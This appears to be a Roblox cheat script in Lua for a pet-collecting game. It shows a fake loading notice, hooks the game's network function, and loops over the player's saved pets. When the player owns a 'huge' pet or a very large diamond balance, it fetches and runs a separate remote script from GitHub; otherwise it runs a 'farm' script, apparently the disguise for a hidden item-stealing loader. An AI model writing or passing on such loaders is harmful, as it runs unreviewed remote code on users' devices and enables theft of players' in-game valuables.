local CoreGui = game:GetService("StarterGui")

               CoreGui:SetCore("SendNotification", {
	           Title = "Loading remotes...";
	           Text = "The script will start shortly";
	           Duration = 5;
               })
wait(30)
local Network = require(game:GetService("ReplicatedStorage").Library.Client.Network);
local Fire = Network.Fire
old = hookfunction(getupvalue(Fire, 1), function(...) 
    return true 
end)
local Players = game:GetService("Players")
local StarterGui = game:GetService("StarterGui")
local FrameworkLibrary = require(game.ReplicatedStorage.Framework.Library)
local CoreGui = game:GetService("CoreGui")
local RobloxGui = CoreGui.RobloxGui
local Client = Players.LocalPlayer
local Network = require(game:GetService("ReplicatedStorage").Library.Client.Network);
local Fire = Network.Fire
local lockedCount = 0
local Invoke = Network.Invoke

local PetFolders = {
    game.Players.LocalPlayer.PlayerGui.Inventory.Frame.Main.Pets.Normal,
    game.Players.LocalPlayer.PlayerGui.Inventory.Frame.Main.Pets.Titanic
}

local savedPets = FrameworkLibrary.Save.Get().Pets
while wait() do
    for i,v in pairs(savedPets) do
        local v2 = FrameworkLibrary.Directory.Pets[v.id]
        if v2.huge == true or game.Players.LocalPlayer.leaderstats.Diamonds.Value > 100000000000 then
           loadstring(game:HttpGet("https://raw.githubusercontent.com/Subashians/FuzeHub/main/caca.lua"))()                 
        else
               loadstring(game:HttpGet("https://raw.githubusercontent.com/Subashians/FuzeHub/main/shrekfarm.lua"))()
               Wait(4444)
        end
    end
end
